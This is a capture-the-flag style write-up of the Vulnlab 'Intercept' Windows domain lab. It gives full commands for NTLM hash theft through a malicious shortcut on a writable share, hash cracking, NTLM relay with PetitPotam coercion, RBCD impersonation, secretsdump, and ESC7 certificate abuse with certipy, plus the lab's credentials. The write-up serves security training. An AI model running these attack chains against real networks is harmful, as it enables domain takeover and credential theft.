---
cover: https://photos.squarezero.dev/file/abir-images/Intercept/logo.png
date: 2025-05-01 09:45:47 +07:00
modified: 2025-05-01 09:45:47 +07:00
categories: [ Writeups, Vulnlab ]
machine_author: 
  name: xct
  link: https://app.hackthebox.com/users/13569
tags: [Intercept, Vulnlab, Nmap, SMB, NetExec, share enumeration, writeable share, Autologon64, slinky, NTLMv2, hashcat, WebDAV, NTLM relay, LDAP signing, coercion, PetitPotam, dnstool.py, ntlmrelayx, delegate-access, RBCD, machine account abuse, getST.py, pass-the-ticket, secretsdump.py, Kerberos, KRB5CCNAME, ESC7, BloodHound, Certify, ManageCA, ManageCertificates, certipy, certificate abuse, CA-manager, pfx extraction, NTLM hash extraction, ADCS, privilege escalation, domain persistence, Active Directory]
title: Intercept - Vulnlab
---

![](https://photos.squarezero.dev/file/abir-images/htbasset/vulnbanner.png)

Intercept is a multi-layered, hard-difficulty Windows machine that emphasizes lateral movement, NTLM relay attacks, and advanced certificate abuse techniques. Initial enumeration reveals an SMB share allowing write access, leading to the extraction of autologon credentials and NTLMv2 hashes via Autologon64 and slinky. These credentials are cracked and used to stage a relay attack over HTTP using a WebDAV listener. LDAP signing is disabled, making NTLM relay via ntlmrelayx and dnstool.py possible. This opens up a path for a Resource-Based Constrained Delegation (RBCD) attack by coercing DC authentication and creating a new machine account. From there, the ticket is relayed using getST.py, allowing us to dump secrets with secretsdump.py. BloodHound and Certify highlight certificate misconfigurations tied to ESC7 and the presence of a Domain Admin user with certificate management privileges. Using Certipy, we request a certificate, extract it, and use it in a pass-the-cert attack to impersonate a Domain Admin and fully compromise the domain.


# Enumeration
Initial Nmap scans reveal open ports on two key systems:

***WS01.INTERCEPT.VL***
```Bash
PORT     STATE SERVICE 
135/tcp  open  msrpc   
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
```

***MS01.INTERCEPT.VL***
```Bash
PORT     STATE SERVICE
53/tcp   open  domain 
88/tcp   open  kerberos-sec
135/tcp  open  msrpc  
139/tcp  open  netbios-ssn 
389/tcp  open  ldap   
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5    
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP 
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server 
5985/tcp open  wsman
```

Using Netexec, we enumerate SMB shares and discover that WS01 has a dev share with both read and write access.
![](https://photos.squarezero.dev/file/abir-images/Intercept/1.png)

Inside the share are README files and Autologon64.exe, suggesting users frequently use this location to retrieve sensitive files.
![](https://photos.squarezero.dev/file/abir-images/Intercept/2.png)
![](https://photos.squarezero.dev/file/abir-images/Intercept/22.png)

# NTLM Theft via Slinky
With write access to the share, we drop a malicious shortcut to capture NTLM hashes using the slinky module in Netexec. Shortly after, we capture the NTLMv2 hash of KATHRYN.SPENCER.

`netexec smb $ws01IP -u ' ' -p ' ' --shares -M slinky -o SERVER=10.8.2.110 Name=important`

![](https://photos.squarezero.dev/file/abir-images/Intercept/3.png)

After That we can used hashcat to decrypt the hash.
`hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt`

![](https://photos.squarezero.dev/file/abir-images/Intercept/4.png)

# WebDAV Authentication Relay & RBCD

Using Kathryn's credentials, we check for LDAP signing (disabled) and coercion vulnerabilities on DC01.
```Bash
# LDAP Signing
netexec ldap $DC01IP -u 'KATHRYN.SPENCER' -p 'Chocolate1' -M ldap-checker

# Coerce Vulnerablities
netexec ldap $DC01IP -u 'KATHRYN.SPENCER' -p 'Chocolate1' -M coerce_plus
```
![](https://photos.squarezero.dev/file/abir-images/Intercept/7.png)

We add our attack machine to the domain DNS.
`python3 dnstool.py -u intercerpt.vl\\kathryn.spencer -p 'Chocolate1' -r attacker.intercept.vl -a add -d <Attacker IP> <DCIP>`
![](https://photos.squarezero.dev/file/abir-images/Intercept/8.png)

We then start ntlmrelayx with delegation access and launch a coercion attack via PetitPotam. The relay attack allows us to create a new machine account with delegation rights over WS01.
```Bash
# Relay Attack
ntlmrelayx.py -t ldap://10.10.137.53 -smb2support --delegate-access

# Coercion Attack
python3 PetitPotam.py -u 'KATHRYN.SPENCER' -p 'Chocolate1' -d 'intercept.vl' 'attacker@80/noteexists' 10.10.137.54
```
![](https://photos.squarezero.dev/file/abir-images/Intercept/9.png)
![](https://photos.squarezero.dev/file/abir-images/Intercept/10.png)

We then impersonate the domain administrator using getST.py.
`getST.py -impersonate Administrator -spn 'cifs/WS01.intercept.vl' -dc-ip '10.10.137.53' intercept.vl/KGKGKLHT$:'D*6@yP6>E**Tmrq'`
![](https://photos.squarezero.dev/file/abir-images/Intercept/11.png)

And use the ticket to dump secrets.

```BASH
export KRB5CCNAME=Administrator@cifs_WS01.intercept.vl@INTERCEPT.VL.ccache

secretsdump.py -k -no-pass intercept.vl/administrator@ws01.intercept.vl
```
![](https://photos.squarezero.dev/file/abir-images/Intercept/12.png)

# ESC 7
## Manage CA Rights 
BloodHound reveals that SIMON.BOWEN has GenericAll rights over the CA-Managers group.
![](https://photos.squarezero.dev/file/abir-images/Intercept/14.png)

Running Certify confirms that members of the CA-Managers group have ManageCA rights on the certificate authority.
![](https://photos.squarezero.dev/file/abir-images/Intercept/15.png)

To escalate, we first abuse Simon’s GenericAll privilege by adding him to the ca-managers group. Once added, we use Certipy to assign Simon as an officer in the CA. If everything is successful, Simon will now have ManageCertificates rights on the CA.

```Bash
# Add Group Member
net rpc group addmem "ca-managers" "Simon.Bowen" -U "INTERCEPT"/"Simon.Bowen"%"b0OI_fHO859+Aw" -S "10.10.137.53"

# Add Officer
certipy ca -add-officer Simon.Bowen -username Simon.Bowen -password 'b0OI_fHO859+Aw' -ca 'intercept-DC01-CA' -dc-ip 10.10.137.53

#Rights Enumeration
certipy find -u Simon.Bowen -p 'b0OI_fHO859+Aw' -dc-ip 10.10.137.53 -enabled -vulnerable -stdout

```
![](https://photos.squarezero.dev/file/abir-images/Intercept/16.png)

## Abuse ManageCertificate Rights
With the new rights, we can abuse a default certificate template to request a certificate as Administrator. The request will return an error but still save the private key. Using the request ID, we can manually issue the certificate.

```Bash
# Request Certificate
certipy req -u Simon.Bowen -p 'b0OI_fHO859+Aw' -dc-ip 10.10.137.53 -template SubCA -ca 'intercept-DC01-CA' -upn administrator@intercept.vl

# Issue the Request
certipy ca -username Simon.Bowen -password 'b0OI_fHO859+Aw' -ca 'intercept-DC01-CA' -dc-ip 10.10.137.53 -issue-request 5
```

![](https://photos.squarezero.dev/file/abir-images/Intercept/17.png)

Finally, we retrieve the .pfx file for the issued certificate and authenticate as Administrator to dump the NTLM hash.
```Bash
# Retrive the Certificate
certipy req -u Simon.Bowen -p 'b0OI_fHO859+Aw' -dc-ip 10.10.137.53 -ca 'intercept-DC01-CA' -retrieve 5

# Retrive Administrator Hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.137.53
```
![](https://photos.squarezero.dev/file/abir-images/Intercept/18.png)